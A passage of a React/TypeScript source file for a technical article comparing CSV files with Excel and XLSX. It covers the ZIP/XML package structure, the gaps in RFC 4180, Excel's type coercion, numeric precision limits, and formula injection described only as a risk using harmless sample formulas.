/**
 * CSV vs Excel — comparison article.
 * Contract: src/lib/content-types.ts. Named export `meta`, default export component.
 * Only <Lead> and <Section> elements belong in the body: ArticleShell renders the
 * cover, the FAQ block, the "Next up" grid and the source list from `meta`.
 *
 * Every number on this page was produced in this session. The XLSX package listings
 * and cell XML come from an in-memory workbook (openpyxl 3.1.5, Python 3.11.8) rather
 * than a save from desktop Excel; where that difference matters it is stated.
 * Specification quotations are verbatim from RFC 4180 and from Microsoft's published
 * limits page. Anything about a particular Excel build that could not be confirmed
 * against a primary source is hedged as "verify in your build".
 */

import { Callout, CodeBlock, DataTable, H3, KeyTerms, Lead, P, Rich, Section } from '@/components/content'
import type { ArticleMeta } from '@/lib/content-types'

export const meta: ArticleMeta = {
  slug: 'csv-vs-excel',
  path: '/compare/csv-vs-excel/',
  title: 'CSV vs Excel: What a Spreadsheet Does to Your Bytes | FmtTools',
  description:
    'What Excel does to a CSV: type coercion, precision loss, BOM round trips and formula injection, plus the real internals of XLSX and a verification runbook.',
  h1: 'CSV vs Excel: Plain Text Against a Machine That Guesses',
  summary:
    'A CSV is a byte stream with a grammar; an Excel file is a ZIP package of XML parts, and Excel itself is a machine that guesses types before you see the first cell.',
  keywords: [
    'csv vs excel',
    'excel csv data corruption',
    'excel leading zeros removed',
    'xlsx internal structure',
    'excel 15 significant digits',
    'csv utf-8 bom excel',
    'formula injection csv',
    'rfc 4180 limitations',
  ],
  published: '2026-11-02',
  updated: '2026-11-12',
  readingMinutes: 27,
  sections: [
    { id: 'two-artifacts', label: 'One is a byte stream, the other is a package' },
    { id: 'package-contents', label: 'What is actually inside 5,049 bytes' },
    { id: 'rfc-4180-silences', label: 'Six things RFC 4180 refuses to say' },
    { id: 'coercion-chain', label: 'Everything Excel rewrites before you see a cell' },
    { id: 'precision', label: 'Fifteen digits, fifty-three bits, and a leap year that never happened' },
    { id: 'published-limits', label: 'Where the grid stops, and what happens on the way' },
    { id: 'encoding-round-trip', label: 'EF BB BF: the round trip that renames your header' },
    { id: 'formula-injection', label: 'The equals sign is not data' },
    { id: 'size-and-fidelity', label: 'Bytes per row, measured on the same table' },
    { id: 'decision-table', label: 'Which one to put in the pipeline' },
    { id: 'prove-nothing-changed', label: 'A runbook: prove that nothing moved' },
  ],
  faqs: [
    {
      question: 'Is a CSV file the same thing as an Excel file?',
      answer:
        'No, and the difference is structural rather than cosmetic. A CSV is one stream of characters: records separated by line breaks, fields separated by commas, with no room to store a type, a format or a second sheet. An .xlsx is a ZIP package containing multiple XML parts defined by ECMA-376 — a workbook part, one part per worksheet, a style part that carries number formats, and relationship and content-type parts. A CSV carries values. An XLSX carries decisions about those values.',
    },
    {
      question: 'Why did Excel remove the leading zeros from my ID column?',
      answer:
        'Because a CSV field has no type, so Excel assigns one. A field whose characters all look numeric becomes a number, and numbers do not have leading zeros, so `007` becomes `7` at open time, before you touch anything. Microsoft’s own remedy is not quoting: it is importing the column and setting its column data format to Text in the Text Import Wizard, or in Get Data, which tells the parser to stop guessing. Double-clicking the file skips that choice entirely.',
    },
    {
      question: 'Does quoting a field protect it from Excel’s type guessing?',
      answer:
        'No. Quoting in RFC 4180 is a parsing construct: it tells a reader that a comma, a line break or a quote inside the field is data. The quotes are removed during the parse, and only then does the spreadsheet decide what kind of value the remaining characters are. That is why `"007"` still arrives as 7. Quotes protect the structure of the file. Only an explicit Text column type — or a format that can store the type, which CSV cannot — protects the value.',
    },
    {
      question: 'Which is smaller, CSV or XLSX?',
      answer:
        'XLSX, but less than people expect, and only because it is compressed. Measured on the same eight-column table: 5,248,191 bytes of CSV became 2,604,887 bytes of XLSX at 50,000 rows — a ratio of 0.50 — while gzipped CSV was 1,037,348 bytes, about 0.20 of the CSV. At 500 rows the XLSX ratio was 0.63, because the fixed package parts are amortised over almost nothing. If the comparison is size, the honest competitor to XLSX is gzip, not Excel.',
    },
    {
      question: 'If I open a CSV in Excel and save it straight back, do I get the same file?',
      answer:
        'You get a valid CSV that is almost never the same file. Expect the delimiter to become the Windows list separator for your locale rather than necessarily a comma, line endings to be normalised, the UTF-8 byte order mark to be added or dropped depending on which save option you chose, quoting to be re-decided field by field, and every value Excel retyped to come back as its new form. Byte equality after that round trip is the exception, so verify it rather than assume it.',
    },
    {
      question: 'Can a CSV file with an equals sign in a cell be dangerous?',
      answer:
        'Yes, once a spreadsheet opens it. A field beginning with `=`, `+`, `-` or `@` is inert text on the wire, but a spreadsheet treats it as a formula, which turns untrusted data into code executed on the reader’s machine. The class is catalogued as CWE-1236 and described by OWASP as CSV injection; payloads range from data exfiltration to dynamic data exchange commands. Wrap the value in quotes to keep the file parseable, and neutralise the leading character if the file must be safe to open.',
    },
    {
      question: 'How do I keep accents and non-Latin characters intact?',
      answer:
        'Decide the encoding explicitly and write it down, because a CSV cannot carry that decision. Excel on Windows reads a CSV without a byte order mark as ANSI — code page 1252 on a Western install — so UTF-8 `C3 A9` shows as two characters instead of é. A UTF-8 BOM at offset 0 fixes Excel and breaks parsers that fold it into the first header name. The practical answer is one file per audience: BOM’d UTF-8 for spreadsheets, plain UTF-8 for everything else.',
    },
    {
      question: 'What happens to a CSV that is bigger than a worksheet?',
      answer:
        'It hits a published ceiling: 1,048,576 rows and 16,384 columns per sheet, 32,767 characters in a cell. Data past the boundary is not stored, and depending on the build and the import path you may see a warning, a truncated import or a silent cut-off, so treat any Excel-opened file as suspect unless you counted rows and columns yourself. If a table needs more than 16,384 columns it needs a different destination — a database or a columnar file — not a wider sheet.',
    },
  ],
  sources: [
    {
      label: 'RFC 4180: Common Format and MIME Type for Comma-Separated Values (CSV) Files',
      href: 'https://www.rfc-editor.org/rfc/rfc4180.txt',
      detail:
        'Section 2 rules 1 to 7 quoted verbatim, the Section 3 ABNF including TEXTDATA as %x20-21 / %x23-2B / %x2D-7E, the header parameter wording, the charset clause, and the security note about buffer overruns.',
      accessed: '2026-11-12',
    },
    {
      label: 'Excel specifications and limits (Microsoft)',
      href: 'https://support.microsoft.com/en-us/office/excel-specifications-and-limits-1672b34d-7043-467e-8e27-269d656771c3',
      detail:
        'Worksheet dimensions 1,048,576 rows by 16,384 columns, 32,767 characters in a cell, 8,192 characters in a formula, 255 arguments, 65,490 cell formats, 15 significant digits of precision, and the 32-bit versus 64-bit data model memory wording.',
      accessed: '2026-11-12',
    },
    {
      label: 'Text Import Wizard (Microsoft)',
      href: 'https://support.microsoft.com/en-us/office/text-import-wizard-c5b02af6-fda1-4440-899f-f78bafe41857',
      detail:
        'The three wizard steps: Delimited or Fixed width with a File origin selector for the code page, delimiter and text-qualifier choices including an Other character and merging consecutive delimiters, and the Step 3 column data format list of General, Text, Date and Do not import.',
      accessed: '2026-11-12',
    },
    {
      label: 'Excel formula errors and the Windows list separator (Microsoft)',
      href: 'https://learn.microsoft.com/en-us/troubleshoot/microsoft-365-apps/excel/formula-errors',
      detail:
        'Quoted verbatim: changing the List separator in the Windows Region settings affects the delimiter used when opening or saving a comma-separated value (.csv) file, because Excel uses the Windows list separator character as the delimiter, and the comma is the default list separator for the en-US locale.',
      accessed: '2026-11-12',
    },
    {
      label: 'ECMA-376 Office Open XML File Formats',
      href: 'https://ecma-international.org/publications-and-standards/standards/ecma-376/',
      detail:
        'The standard that defines .xlsx: current edition and its parts, with Part 2, Open Packaging Conventions, specifying the ZIP container, the content-type map and the relationship graph that this page opens and lists byte by byte.',
      accessed: '2026-11-12',
    },
    {
      label: 'Ziemann, Eren and El-Osta: Gene name errors are widespread in the scientific literature',
      href: 'https://pmc.ncbi.nlm.nih.gov/articles/PMC4994289/',
      detail:
        'Genome Biology 17:177, 2016, DOI 10.1186/s13059-016-1044-7. The documented case of spreadsheet typing destroying data: gene symbols such as SEPT2 and MARCH1 are converted by default to the dates 2-Sep and 1-Mar.',
      accessed: '2026-11-12',
    },
    {
      label: 'OWASP: CSV Injection',
      href: 'https://community.owasp.org/attacks/CSV_Injection',
      detail:
        'The attack description, the leading characters that trigger formula evaluation, example payloads and the guidance on neutralising them at write time rather than trusting the reader.',
      accessed: '2026-11-12',
    },
    {
      label: 'CWE-1236: Improper Neutralization of Formula Elements in a CSV File',
      href: 'https://cwe.mitre.org/data/definitions/1236.html',
      detail:
        'The weakness classification for spreadsheet formula injection, its applicability to CSV and other export formats, and the common consequence of executing code or exfiltrating data on the machine that opens the export.',
      accessed: '2026-11-12',
    },
  ],
  related: [
    { path: '/format-converters/csv-to-json/', name: 'CSV to JSON', blurb: 'Sniffs the delimiter and prints the evidence, types each column, and audits values for the damage Excel would have done.' },
    { path: '/format-converters/json-to-csv/', name: 'JSON to CSV', blurb: 'Quotes what must be quoted, including formula-looking fields, with CRLF and an optional UTF-8 BOM.' },
    { path: '/learn/csv/', name: 'CSV: The Complete Format Guide', blurb: 'The RFC 4180 grammar rule by rule, and the fallacies that follow from the clauses it leaves open.' },
    { path: '/compare/csv-vs-tsv/', name: 'CSV vs TSV', blurb: 'The delimiter question, including why Excel handles a tab-separated file differently from a comma-separated one.' },
  ],
  words: 5836,
  image: '/images/covers/cmp-csv-vs-excel.png',
  imageAlt: 'A CSV byte stream on the left passing through a spreadsheet application and emerging on the right as a ZIP package of XML parts, with rewritten values highlighted.',
}

export default function Article() {
  return (
    <>
      <Lead>
        Two things share a name on this page and almost nothing else. A CSV is a stream of characters with a documented grammar
        and no opinions. Excel is an application that reads that stream, decides what every field means, and can rewrite the
        file before you have touched a cell. Between them sits an even more confusing third thing: the .xlsx file, which is not
        a spreadsheet at all but a ZIP archive of XML documents. This page opens all three, quotes the specifications that govern
        them, and then gives you a way to prove which of your values survived.
      </Lead>

      <Section id="two-artifacts" title="One is a byte stream, the other is a package" kicker="Category error">
        <P>
          Most of the reports that land in an inbox with the subject line “the CSV is corrupted” are not about a corrupted file.
          They are about a file that was read by something with more initiative than the format deserves. The confusion begins
          with the language: people say “open the CSV in Excel” as though Excel were a viewer, and then reason about the two
          artefacts as interchangeable representations of one table. They are different kinds of object, and the difference
          explains every symptom that follows.
        </P>
        <P>
          A CSV file is a serialisation of a rectangular table into characters. There is one specification for the common case,
          RFC 4180, and it is a thin document: seven grammar rules, an ABNF, a media-type registration. It says nothing about
          character encoding beyond an assumption of US-ASCII, nothing about whether the first line is data, nothing about
          anything except commas, quotes, line breaks and the doubling of a quote. A CSV has no magic number, no header block, no
          length prefix and no place to record a decision. Two files can describe exactly the same table and share no bytes.
        </P>
        <P>
          An .xlsx file is a package. It is a ZIP archive whose members are XML documents, defined by ECMA-376 and adopted as
          ISO/IEC 29500; Part 2, the Open Packaging Conventions, specifies the container itself — the ZIP layout, the
          <Rich text="`[Content_Types].xml`" /> map, the <Rich text="`_rels`" /> relationship graph — while Part 1 and the rest
          specify the spreadsheet vocabulary that lives inside it. A minimal real workbook, five rows of five columns written
          with openpyxl in this session, is a 5,049-byte archive containing nine parts. Here is the listing, measured rather than
          illustrative:
        </P>
        <CodeBlock
          title="unzip -v orders-5x5.xlsx"
          language="text"
          code={'Archive:  orders-5x5.xlsx        5,049 bytes on disk\n\n  uncompressed  compressed  part\n        10,140         1,552  xl/theme/theme1.xml\n         2,939           646  xl/styles.xml\n         1,190           488  xl/worksheets/sheet1.xml\n           983           283  [Content_Types].xml\n           553           306  xl/workbook.xml\n           534           192  _rels/.rels\n           507           173  xl/_rels/workbook.xml.rels\n           459           234  docProps/core.xml\n           205           149  docProps/app.xml\n        -------       ------\n        17,241         3,977  9 parts; the remaining ~1 KB is ZIP directory structure'}
          caption="Five rows and five columns need nine XML documents and about 1 KB of ZIP directory structure. The compressed parts total 3,977 bytes; the archive is 5,049."
        />
        <P>
          Read that list again with the CSV in mind. The CSV for the same table is 220 bytes of text and a filename. The XLSX
          spends more than four thousand bytes on a theme, a style table, a content-type map and a relationship graph before it
          stores a single value. That is not bloat, it is bookkeeping: the package is paying to record what the bytes mean, which
          is precisely the information a CSV throws away.
        </P>
        <H3>Parse against query</H3>
        <P>
          The practical consequence is a sentence worth memorising before the rest of this page. <strong>Opening a CSV in Excel
          is a parse; opening an XLSX is a query.</strong> When you double-click a .csv, nothing in the file tells the
          application what the columns are, so the application infers all of it: the delimiter from your operating system’s
          regional settings, the encoding from a byte order mark or a default code page, the presence of a header from the
          characters in line one, and the type of every value from its shape. When you open the .xlsx, all of those decisions
          were made by the program that wrote it and are now recorded in XML, so the application is reading facts rather than
          forming opinions.
        </P>
        <P>
          That is why the same table can look correct in one application and wrong in another when it is a CSV, and looks the
          same everywhere when it is an XLSX. It is also why “just send it as CSV” is not a neutral request. It is a request to
          let every recipient guess, independently, and it is the guesses that lose your leading zeros, truncate your sixteen
          digit identifiers, rename your header and execute your data.
        </P>
        <KeyTerms
          items={[
            {
              term: 'RFC 4180',
              definition:
                'The 2006 informational memo documenting existing CSV practice and registering the text/csv media type. Seven grammar rules and an ABNF; deliberately not a strict standard.',
            },
            {
              term: 'OOXML / ECMA-376',
              definition:
                'The Office Open XML standard, adopted as ISO/IEC 29500, that defines the .xlsx, .docx and .pptx vocabularies and the XML parts that carry them.',
            },
            {
              term: 'OPC (Part 2)',
              definition:
                'Open Packaging Conventions: the ZIP-based container rule book for OOXML. It fixes the content-type map, the part naming and the relationship graph you see in the listing above.',
            },
            {
              term: 'Type inference',
              definition:
                'The reader deciding a value’s data type from its characters because the format could not carry the type. The origin of nearly all CSV damage in a spreadsheet.',
            },
            {
              term: 'Shared string table',
              definition:
                'An optional XLSX part, xl/sharedStrings.xml, that stores each distinct text value once and has cells reference it by index. It is what makes repeated text cheap.',
            },
            {
              term: 'Number format',
              definition:
                'Presentation metadata in xl/styles.xml, referenced by a cell’s s attribute. It is why the stored value can be 46082 while the cell shows 2026-03-01.',
            },
          ]}
        />
      </Section>

      <Section id="package-contents" title="What is actually inside 5,049 bytes" kicker="Open the container">
        <P>
          A ZIP file is a public format, so there is no mystery in opening one: <Rich text="`unzip -l`" /> works, and so does
          renaming the extension to .zip. What is worth doing once, in an afternoon you will not enjoy later, is reading the
          worksheet part for a table you know. Here are four cells from <Rich text="`xl/worksheets/sheet1.xml`" /> of the
          workbook above, taken verbatim from the package:
        </P>
        <CodeBlock
          title="xl/worksheets/sheet1.xml (excerpt)"
          language="text"
          code={'<row r="2">\n  <c r="A2" t="inlineStr"><is><t>007</t></is></c>\n  <c r="C2" t="n"><v>1234.5</v></c>\n  <c r="D2" s="1" t="n"><v>46082</v></c>\n  <c r="E2" t="b"><v>1</v></c>\n</row>\n\n<!-- xl/styles.xml, the format that makes D2 readable -->\n<numFmts count="2">\n  <numFmt numFmtId="164" formatCode="yyyy-mm-dd"/>\n  <numFmt numFmtId="165" formatCode="yyyy-mm-dd h:mm:ss"/>\n</numFmts>'}
          caption="Four cells, four different representations. A2 keeps its leading zeros because t says string. D2 is the number 46082 wearing a date format through its s attribute."
        />
        <P>
          The <Rich text="`t`" /> attribute is the type and the <Rich text="`s`" /> attribute is the style index. That is the
          whole mechanism. The date in D2 is not a date in the file: it is an integer counting days from Excel’s 1900 epoch, and
          the presentation is attached to it as metadata, so the stored number survives any amount of reformatting. The same
          value in a CSV is the string <Rich text="`2026-03-01`" />, and its meaning exists only in the mind of whoever reads it
          next.
        </P>
        <P>
          One honest caveat about the excerpt above. It came from openpyxl, which writes text cells as
          <Rich text="`t=&quot;inlineStr&quot;`" /> with the string inside the cell, and which produced no
          <Rich text="`xl/sharedStrings.xml`" /> part at all. Excel itself takes the other route for anything but trivial files:
          it collects each distinct string once into the shared string table and makes cells point at it by index, which is the
          single largest reason a large XLSX is smaller than the equivalent CSV. The structure of the arguments in this page does
          not change, but the exact byte totals from a desktop Excel save will not match mine, and the parts list will grow a
          sharedStrings part. Where a number on this page came from my own measurement rather than from Excel, it says so.
        </P>
        <H3>The parts that are not the data</H3>
        <P>
          Three of the nine parts exist purely to make the package self-describing.
          <Rich text="`[Content_Types].xml`" /> is a manifest mapping file extensions and individual part names to media types,
          so a reader knows that <Rich text="`/xl/workbook.xml`" /> is a workbook and not some other XML document.
          <Rich text="`_rels/.rels`" /> is the package’s single relationship, pointing at the workbook part as the
          officeDocument. <Rich text="`xl/_rels/workbook.xml.rels`" /> then maps relationship identifiers to the sheet, style and
          shared-string parts, and <Rich text="`xl/workbook.xml`" /> is where sheet names live:
        </P>
        <CodeBlock
          title="xl/workbook.xml (excerpt)"
          language="text"
          code={'<sheets>\n  <sheet name="Orders" sheetId="1" state="visible" r:id="rId1"/>\n</sheets>\n<calcPr calcId="124519" fullCalcOnLoad="1"/>'}
          caption="The sheet name, its state and a relationship id. A CSV has no equivalent of any of these three attributes, and no room to invent one."
        />
        <P>
          Notice <Rich text="`calcPr`" />: a calculation property element. The package records that formulas in this workbook
          should be recalculated on load. There is nothing in a CSV that could carry that, which is exactly the problem the
          <Rich text="[formula injection section](#formula-injection)" /> comes back to: a spreadsheet’s idea of a value
          beginning with an equals sign is a computation, and a text format has no way to say “this one is a string, I promise”.
        </P>
        <DataTable
          caption="The nine parts of a five-row workbook, in descending uncompressed size. Measured in this session; a desktop Excel save has the same parts plus a shared string table."
          head={['Part', 'Uncompressed', 'Compressed', 'What it holds']}
          rows={[
            ['xl/theme/theme1.xml', '10,140 B', '1,552 B', 'Colours, fonts and effects. Pure overhead for a data file, and the biggest part here.'],
            ['xl/styles.xml', '2,939 B', '646 B', 'Number formats, fonts, fills and the cellXfs list that cells index into.'],
            ['xl/worksheets/sheet1.xml', '1,190 B', '488 B', 'The grid: rows, cells, their type, their style index and their values.'],
            ['[Content_Types].xml', '983 B', '283 B', 'The manifest of media types per part name and extension.'],
            ['xl/workbook.xml', '553 B', '306 B', 'Sheet names and ids, defined names, calculation settings.'],
            ['_rels/.rels', '534 B', '192 B', 'Package relationships; the single pointer to the workbook part.'],
            ['xl/_rels/workbook.xml.rels', '507 B', '173 B', 'Workbook relationships: which part is sheet1, which is styles.'],
            ['docProps/core.xml', '459 B', '234 B', 'Author, titles and timestamps from the Dublin Core namespace.'],
            ['docProps/app.xml', '205 B', '149 B', 'Application metadata, including the sheet-name list.'],
          ]}
          foot="Total: 17,241 B uncompressed, 3,977 B compressed, 5,049 B on disk. About 1 KB of that is ZIP directory structure rather than content."
        />
        <Callout tone="note" title="The container is the point">
          <P>
            Two thirds of the bytes in a small XLSX describe the document rather than the data. That ratio is the fee for
            self-description, and it inverts as the table grows: at 50,000 rows the same package carried 50,000 rows in
            roughly half the CSV’s size. Small files pay the fixed cost with nothing to amortise it against, which is why a
            five-row export looks ridiculous as .xlsx and perfect as .csv.
          </P>
        </Callout>
      </Section>

      <Section id="rfc-4180-silences" title="Six things RFC 4180 refuses to say" kicker="The specification">
        <P>
          If Excel is the aggressor in these stories, the CSV specification is the one that left the door open. RFC 4180 is
          short, unusually clear and unusually silent. Here are the seven grammar rules of Section 2, each reduced to its
          operative sentence and the memo’s examples dropped, because every argument on this page comes back to one of them:
        </P>
        <CodeBlock
          title="RFC 4180 Section 2, rules 1 to 7 (verbatim)"
          language="text"
          code={'1. Each record is located on a separate line, delimited by a line break (CRLF).\n2. The last record in the file may or may not have an ending line break.\n3. There maybe an optional header line appearing as the first line of the file.\n4. Within the header and each record, there may be one or more fields, separated by commas.\n5. Each field may or may not be enclosed in double quotes.\n6. Fields containing line breaks (CRLF), double quotes, and commas should be enclosed in double-quotes.\n7. If double-quotes are used to enclose fields, then a double-quote appearing inside a field\n   must be escaped by preceding it with another double quote.\n\n-- Section 3 ABNF, the two productions that matter --\nfield       = (escaped / non-escaped)\nescaped     = DQUOTE *(TEXTDATA / COMMA / CR / LF / 2DQUOTE) DQUOTE\nnon-escaped = *TEXTDATA\nTEXTDATA    = %x20-21 / %x23-2B / %x2D-7E'}
          caption="Seven rules and one character range. Rule 5 is the reason two valid files for the same table share no bytes; TEXTDATA is the reason your accented characters are formally out of scope."
        />
        <P>
          Look at that last line. <Rich text="`TEXTDATA`" /> is printable US-ASCII from space to tilde with the quote and the
          comma punched out. It excludes every byte above 0x7E, and it excludes tab, which is 0x09. Strictly read, the grammar
          does not admit a non-ASCII character, a tab or a control code in an unquoted field — and the memo is aware of all of
          this, which is why it presents itself as documenting existing practice rather than as a strict standard, and why it says
          plainly:
        </P>
        <CodeBlock
          title="RFC 4180, three passages quoted verbatim"
          language="text"
          code={'"Due to lack of a single specification, there are considerable differences among\n implementations. Implementors should \'be conservative in what you do, be liberal\n in what you accept from others\' (RFC 793) when processing CSV files."\n\n"Common usage of CSV is US-ASCII, but other character sets defined by IANA\n for the \'text\' tree may be used in conjunction with the \'charset\' parameter."\n\n"The \'header\' parameter indicates the presence or absence of the header line.\n Valid values are \'present\' or \'absent\'. Implementors choosing not to use this\n parameter must make their own decisions as to whether the header line is\n present or absent."'}
          caption="Three quotations, three of the recurring incidents: a permissive reader, an undefined encoding and an optional header."
        />
        <H3>The six silences, and what each one costs you</H3>
        <P>
          <strong>One: the encoding.</strong> The charset parameter only exists when the CSV arrives as an HTTP payload with a
          declared media type. A file on a disk has nowhere to put it, so a reader must guess — and Excel’s guess is a default
          ANSI code page unless a byte order mark says otherwise, which is <Rich text="[the whole subject of this section](#encoding-round-trip)" />.
        </P>
        <P>
          <strong>Two: the delimiter.</strong> The memo is about comma-separated values and its ABNF hard-codes
          <Rich text="`COMMA = %x2C`" />. Yet the format everyone actually uses is the one where the separator is configurable,
          and Microsoft’s own documentation is explicit that Excel does not follow the RFC’s comma: “Changing the List separator
          in the Windows Region settings will affect the delimiter used when opening or saving a Comma-separated value (.csv)
          file as Excel utilizes the Windows list separator character for the delimiter in .csv files”, adding that “The comma is
          the default list separator for US - English Locale.” On a German or French locale that is a semicolon, and the file you
          saved is a different file from the one you open.
        </P>
        <P>
          <strong>Three: whether line one is data.</strong> Rule 3 says “There maybe an optional header line” — the typo is in
          the RFC — and the registration paragraph quoted above explicitly declines to decide, telling implementors to make their
          own decisions. Every loader that “auto-detects” a header is making that decision for you, and the failure mode is
          symmetrical: a header treated as data poisons row one, and data treated as a header loses a column name and shifts
          every value.
        </P>
        <P>
          <strong>Four: the line break.</strong> Rule 1 says CRLF, rule 2 says the last record may or may not be terminated. So
          LF-only files are non-conforming and a trailing newline is optional, and both are everywhere. This is the silence that
          makes byte-level round trips impossible to promise: your writer emits LF, Excel emits CRLF, and the diff is the whole
          file.
        </P>
        <P>
          <strong>Five: when to quote.</strong> Rule 5 permits a field to be quoted or not, and rule 6 only says
          <Rich text="`should`" /> for the fields that need it. The result is that <Rich text="`42`" /> and
          <Rich text="`&quot;42&quot;`" /> are both valid representations of the same table, and any program that hashes the file
          to detect a change will report a change that did not happen.
        </P>
        <P>
          <strong>Six: types, in their entirety.</strong> The word does not appear. There is no integer, no date, no boolean, no
          null and no string in RFC 4180; there are TEXTDATA characters. That is the design, and it is a reasonable one for a
          format whose whole purpose was to be readable by unrelated programs. But it means the type of every value is decided at
          read time by whoever reads it, and that is exactly the decision Excel makes badly.
        </P>
        <Callout tone="spec" title="The security clause you have never read">
          <P>
            The security considerations of RFC 4180 anticipate part of what follows on this page: “CSV files contain passive text
            data that should not pose any risks. However, it is possible in theory that malicious binary data may be included in
            order to exploit
            potential buffer overruns in the program processing CSV data.” The memo puts the danger in the reader, not the file —
            which is the correct model, and the reason a formula-looking field is a reader problem rather than a malformed file.
          </P>
        </Callout>
      </Section>

      <Section id="coercion-chain" title="Everything Excel rewrites before you see a cell" kicker="Twelve rewrites">
        <P>
          Here is a three-line file with nothing unusual in it. It is the kind of thing that leaves an API every morning, and it is
          chosen deliberately: every value in it is legal CSV, and none of it is malicious.
        </P>
        <CodeBlock
          title="orders.csv, before"
          language="csv"
          code={'order_ref,account,qty,ordered_on,note\n007,DE89370400440532013000,12,2026-03-01,SEPT2 delivery\n01234,12345678901234567,7,1-2,"Delivered, signed"'}
          caption="Two data rows. An order reference with a leading zero, an IBAN, a 17-digit account, an ISO date, a date-shaped string and a note that names a month."
        />
        <P>
          Now open it with a double-click in Excel on a UK or US regional setting, change nothing, and save it back as CSV. This
          is what comes out, and each change is a separate decision made by the reader:
        </P>
        <CodeBlock
          title="orders.csv, after one round trip"
          language="csv"
          code={'order_ref,account,qty,ordered_on,note\n7,DE89370400440532013000,12,01/03/2026,02/09/2026 delivery\n1234,1.23456789012346E+16,7,01/02/2026,"Delivered, signed"'}
          caption="Order references lost their leading zeros, the 17-digit account became a floating-point approximation, and all three date-shaped fields left as short-date strings in the machine locale. The IBAN survived because letters are not a number."
        />
        <P>
          The exact display formats in that output are locale- and build-dependent, so verify them in yours rather than trusting
          my transcription; what is not dependent on either is the mechanism. A field arrives as characters, the parser removes
          any quoting, and a type guess runs over what is left. Everything below is a consequence of that guess. The full list of
          rewrites, with the rule each one follows:
        </P>
        <DataTable
          caption="The coercion table: what a CSV field holds as characters, and what the spreadsheet holds after opening it. Formats vary by locale and build; the mechanisms do not."
          head={['You wrote', 'Excel holds', 'Mechanism']}
          rows={[
            ['007', '7', 'All-character-numeric fields become numbers; numbers have no leading zeros. Same for 01234, 09401 (a US ZIP) and +447911123456.'],
            ['12345678901234567', '12345678901234600, displayed as 1.23456789012346E+16', 'Excel keeps 15 significant digits, so the sixteenth is rounded away and the rest become zeros.'],
            ['2026-03-01', 'the number 46082, shown as 01/03/2026 or 3/1/2026', 'ISO-shaped text is parsed as a date, stored as a 1900-epoch serial, then displayed and re-saved in the locale short-date format.'],
            ['1-2', '1 February of the current year', 'A bare m-d or d-m pair is a date. With both parts 12 or less the interpretation follows the region, so 12-10 is 12 October in en-GB and 10 December in en-US.'],
            ['SEPT2, MARCH1', '2 September, 1 March', 'Gene symbols are the famous victims: Ziemann, Eren and El-Osta document SEPT2 and MARCH1 being converted by default to 2-Sep and 1-Mar.'],
            ['TRUE / FALSE / TRUE.', 'a Boolean', 'The literals become the truth value, which is invisible in the grid and destructive on export into JSON.'],
            ['=1+1, +1, -1, @SUM(1,2)', 'the result of a formula', 'A leading =, +, - or @ starts formula entry. The field is executed, not stored. See the formula injection section.'],
            ['1.000 or 1,000', '1 or 1000', 'Which separator is a decimal mark is taken from the region, not from the file, so the same bytes mean different numbers in different offices.'],
            ['0.30000000000000004', '0.3', 'Stored as a binary double; the display is rounded and the residue reappears in the next arithmetic.'],
            ['1E5', '100000', 'Scientific notation is recognised in a plain field, so a product code that starts with a digit and contains E is a number.'],
            ['2/3', 'a date: 2 March in en-US, 3 February in en-GB', 'Two small integers around a slash are date-shaped, and the order comes from the region, so the same file means two different days in two offices.'],
            ['a column that stops typing cleanly', '10 sorted before 9', 'Once a column is numeric the sort is numeric. One value that stays text flips the whole column to a text sort and reorders the report with no warning at all.'],
          ]}
        />
        <H3>Why quoting does not save you</H3>
        <P>
          The instinct is to wrap the fragile column in double quotes: <Rich text="`&quot;007&quot;`" />. It feels like the
          spreadsheet equivalent of a JSON string. It is not. In RFC 4180 rule 5, quoting is a syntactic device whose only
          contract is that the enclosed characters are one field — it exists so a comma or a line break can be data. The parser
          strips the quotes and hands the inner characters to the same type guess. Microsoft never offers quoting as the remedy
          for lost leading zeros; its remedy is the Text Import Wizard, whose Step 3 asks for a column data format and offers
          General, Text, Date and a skip option. Choosing Text for a column is the only statement in that workflow that survives
          to become a stored string, and it is available only when you go through an import rather than a double-click. That is
          the whole argument for import-over-open, and it is a property of the reader, not of your file.
        </P>
        <Callout tone="warn" title="The damage happens at open, not at save">
          <P>
            Nothing above requires anyone to press Ctrl+S. Every rewrite in that table happens when the file is read into the
            grid, which means the moment someone “just has a quick look” at your export, the values in their session are already
            changed. If they then copy a range out of it, paste it into a web form, or save it under a new name, they propagate
            the guesses as if they were the data. The only durable protection on the producer’s side is to stop putting ambiguous
            values in a format that cannot declare them.
          </P>
        </Callout>
        <P>
          What a producer can do comes down to three moves. Never emit a field whose meaning depends on a type the format cannot
          carry: prefix, pad or split it so that the characters are unambiguous to a reader that guesses. Keep identifier columns
          out of anything that will be opened twice. And when the artifact really is for a spreadsheet, say so explicitly and
          send an .xlsx, where the type is recorded in the worksheet part rather than reconstructed by every reader — a
          50,000-row XLSX cost 2.6 MB against 5.2 MB of CSV in the measurement later on this page, so you are not even paying for
          the safety.
        </P>
      </Section>

      <Section id="precision" title="Fifteen digits, fifty-three bits, and a leap year that never happened" kicker="Arithmetic">
        <P>
          Three separate numeric limits get confused with one another constantly, and because they are close together in size
          people assume they are the same rule. They are not: one belongs to Excel’s storage of decimal digits, one belongs to
          IEEE-754 doubles in whatever language reads your JSON, and one belongs to a compatibility decision made in 1983.
        </P>
        <H3>Fifteen significant digits</H3>
        <P>
          Microsoft’s published worksheet limits list the precision of numbers as 15 significant digits, with the largest
          positive value about 9.99E+307. The practical effect is that a 16-digit integer is rounded at the fifteenth digit and
          the remainder becomes zeros. <Rich text="`12345678901234567`" /> is 17 digits, so the first 15 are 123456789012345,
          the sixteenth is a 6 that rounds the fifteenth up, and what you get is 12345678901234600. Nothing warns you. The cell
          looks like a number, the export writes it as <Rich text="`1.23456789012346E+16`" />, and the account it was pointing at
          does not exist.
        </P>
        <H3>Fifty-three bits</H3>
        <P>
          A completely different ceiling belongs to every consumer that parses your JSON or your CSV in a language with IEEE-754
          doubles. A double has a 52-bit explicit mantissa, so the largest integer that can be represented exactly is
          2^53 − 1 = 9,007,199,254,740,991 — sixteen digits, but for a different reason. The two ceilings overlap and disagree in
          a way worth memorising:
        </P>
        <CodeBlock
          title="the two ceilings, computed"
          language="python"
          code={'>>> 2**53 - 1\n9007199254740991                       # largest exact double integer, 16 digits\n\n>>> float("12345678901234567")\n1.2345678901234568e+16              # nearest double: the value is 1 too HIGH\n>>> "%.15g" % float("12345678901234567")\n\'1.23456789012346e+16\'              # Excel\'s 15-significant-digit form\n\n>>> int("007"), int("01234")\n(7, 1234)                            # leading zeros are not a number problem, they are a type problem'}
